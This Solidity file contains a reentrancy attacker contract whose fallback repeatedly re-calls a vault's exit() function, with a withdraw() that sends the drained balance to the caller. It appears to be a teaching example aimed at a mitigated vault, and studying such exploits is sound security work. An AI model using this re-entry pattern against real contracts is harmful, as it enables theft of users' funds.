// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./reentrancyMitigate.sol";

contract reentrancyExploitMitigate {
    AssetVaultMitigate public assetVault;
    uint8 public callCount;

    constructor(address _assetVaultAddress) {
        assetVault = AssetVaultMitigate(_assetVaultAddress);
    }

    receive() external payable {}

    fallback() external payable {
        if (callCount < 10) {
            // Limit to prevent infinite loop
            callCount++;
            assetVault.exit(0.5 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 0.5 ether, "Min deposit 0.5 ETH");
        assetVault.enter{value: msg.value}();
        assetVault.exit(0.5 ether);
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
